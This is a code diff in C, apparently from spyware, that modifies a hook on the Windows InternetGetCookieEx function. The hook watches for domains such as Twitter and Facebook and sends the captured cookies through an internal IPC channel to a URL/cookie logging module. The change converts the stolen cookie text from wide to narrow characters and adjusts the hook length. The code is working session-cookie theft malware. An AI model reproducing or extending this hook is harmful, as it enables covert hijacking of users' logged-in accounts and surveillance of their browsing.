@@ -425,6 +425,8 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
 	DWORD local_size = MAX_COOKIE_SIZE-1;
 	WCHAR *local_cookie;
+	char *local_cookie_char;
+	DWORD i;
 
 	// Cerca di capire se si tratta di un dominio interessante
 	local_cookie = pData->local_cookie;
@@ -471,13 +473,21 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	CALL_ORIGINAL_API_SEQ(6)
 
 	if (ret_code) {
-		WCSLEN(local_cookie, name_len);
-		if (name_len > 0) {
-			name_len = (name_len+1)*sizeof(WCHAR);
-			// Spero che tagliando rimanga la parte importante di cookie...
-			if (name_len > MAX_MSG_LEN)
-				name_len = MAX_MSG_LEN;
-			pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)local_cookie, name_len, origin, IPC_DEF_PRIORITY);
+		if (local_cookie[0] != 0) {
+			// Toglie gli zeri 
+			local_cookie_char = (char *)local_cookie;
+			for (i=0; local_cookie[i]; i++)
+				local_cookie_char[i] = (char)local_cookie[i];
+			local_cookie_char[i] = 0;
+
+			WCSLEN(local_cookie_char, name_len);
+			if (name_len > 0) {
+				name_len++;
+				// Spero che tagliando rimanga la parte importante di cookie...
+				if (name_len > MAX_MSG_LEN)
+					name_len = MAX_MSG_LEN;
+				pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)local_cookie_char, name_len, origin, IPC_DEF_PRIORITY);
+			}
 		}
 	}
 
@@ -522,7 +532,7 @@ DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
 	ZeroMemory(InternetGetCookieExData.local_cookie, sizeof(InternetGetCookieExData.local_cookie));
 	InternetGetCookieExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
 	InternetGetCookieExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	InternetGetCookieExData.dwHookLen = 990;
+	InternetGetCookieExData.dwHookLen = 1000;
 	return 0;
 }
 
@@ -530,7 +540,7 @@ DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
 DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
 	DWORD origin = COOKIE_MASK;
-	DWORD size = sizeof(FACEBOOK_IE_COOKIE)-sizeof(WCHAR);
+	DWORD size = sizeof(FACEBOOK_IE_COOKIE)-sizeof(char);
 	origin = dwFlags & (~origin);
 
 	if (dwLen < 4)
